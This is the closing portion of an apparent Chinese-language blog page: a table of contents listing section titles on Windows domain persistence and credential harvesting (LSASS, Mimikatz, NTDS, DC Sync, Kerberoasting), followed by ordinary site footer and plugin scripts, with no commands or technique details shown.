class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E8%8C%83%E5%9B%B4%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">7.7.1.</span> <span class="toc-text">域范围持久化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87"><span class="toc-number">7.7.2.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA-GPO"><span class="toc-number">7.7.3.</span> <span class="toc-text">创建 GPO</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-3"><span class="toc-number">7.8.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%8C%81%E4%B9%85%E5%8C%96%E6%8A%80%E6%9C%AF"><span class="toc-number">7.8.1.</span> <span class="toc-text">其他持久化技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">7.8.2.</span> <span class="toc-text">防御措施</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Credentials-Harvesting"><span class="toc-number">8.</span> <span class="toc-text">Credentials Harvesting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E7%9A%84%E5%87%AD%E6%8D%AE"><span class="toc-number">8.1.</span> <span class="toc-text">直接访问的凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E6%9C%AC%E5%9C%B0%E5%87%AD%E6%8D%AE"><span class="toc-number">8.2.</span> <span class="toc-text">Windows 本地凭据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SAM-%E6%96%87%E4%BB%B6"><span class="toc-number">8.2.1.</span> <span class="toc-text">SAM 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E8%83%BD%E8%AF%BB%E5%8F%96-SAM-%E6%96%87%E4%BB%B6%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95"><span class="toc-number">8.2.2.</span> <span class="toc-text">不能读取 SAM 文件的解决办法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF"><span class="toc-number">8.2.2.1.</span> <span class="toc-text">MSF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Volume-Shadow-Copy-Service"><span class="toc-number">8.2.2.2.</span> <span class="toc-text">Volume Shadow Copy Service</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Registry-Hives"><span class="toc-number">8.2.2.3.</span> <span class="toc-text">Registry Hives</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E5%AD%90%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1"><span class="toc-number">8.3.</span> <span class="toc-text">本地安全管理子系统服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-LSASS"><span class="toc-number">8.3.1.</span> <span class="toc-text">什么是 LSASS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E5%82%A8-LSASS"><span class="toc-number">8.3.2.</span> <span class="toc-text">转储 LSASS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E7%9A%84-LSASS"><span class="toc-number">8.3.3.</span> <span class="toc-text">保护的 LSASS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows-%E5%87%AD%E6%8D%AE%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-number">8.4.</span> <span class="toc-text">Windows 凭据管理器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E5%87%AD%E6%8D%AE%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-number">8.4.1.</span> <span class="toc-text">访问凭据管理器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E5%82%A8%E5%87%AD%E6%8D%AE"><span class="toc-number">8.4.2.</span> <span class="toc-text">转储凭据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RunAs"><span class="toc-number">8.4.3.</span> <span class="toc-text">RunAs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mimikatz-%E6%8F%90%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">8.4.4.</span> <span class="toc-text">Mimikatz 提取密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7"><span class="toc-number">8.5.</span> <span class="toc-text">域控</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTDS-Domain-Controller"><span class="toc-number">8.5.1.</span> <span class="toc-text">NTDS Domain Controller</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ntdsutil"><span class="toc-number">8.5.2.</span> <span class="toc-text">Ntdsutil</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0-Dump%EF%BC%88%E6%97%A0%E5%87%AD%E8%AF%81%EF%BC%89"><span class="toc-number">8.5.3.</span> <span class="toc-text">本地 Dump（无凭证）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B-Dump%EF%BC%88%E6%9C%89%E5%87%AD%E8%AF%81%EF%BC%89"><span class="toc-number">8.5.4.</span> <span class="toc-text">远程 Dump（有凭证）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DC-Sync"><span class="toc-number">8.5.4.1.</span> <span class="toc-text">DC Sync</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Local-Administrator-Password-Solution-LAPS"><span class="toc-number">8.6.</span> <span class="toc-text">Local Administrator Password Solution (LAPS)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%EF%BC%88Group-Policy-Preferences-GPP%EF%BC%89"><span class="toc-number">8.6.1.</span> <span class="toc-text">组策略首选项（Group Policy Preferences, GPP）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-Administrator-Password-Solution-LAPS-1"><span class="toc-number">8.6.2.</span> <span class="toc-text">Local Administrator Password Solution (LAPS)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">8.7.</span> <span class="toc-text">其他攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting"><span class="toc-number">8.7.1.</span> <span class="toc-text">Kerberoasting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting"><span class="toc-number">8.7.2.</span> <span class="toc-text">AS-REP Roasting</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-4"><span class="toc-number">8.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
                </div>
            </button>
            

            

            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
        </div>
    </div>
</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
</div><!-- hexo injector body_end start -->
  <script>
  const CODE_CONFIG = {
    beautify: undefined,
    highlightCopy: undefined,
    highlightLang: undefined,
    highlightHeightLimit: undefined,
    isHighlightShrink: undefined,
    copy: {
      success: 'undefined',
      error: 'undefined',
      noSupport: 'undefined',
    }
  };
  console.log(
    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
    "color: #fff; background: #5f5f5f",
    "color: #fff; background: #80c8f8",
    ""
  );
  </script>
  <!-- hexo injector body_end end --></body></html>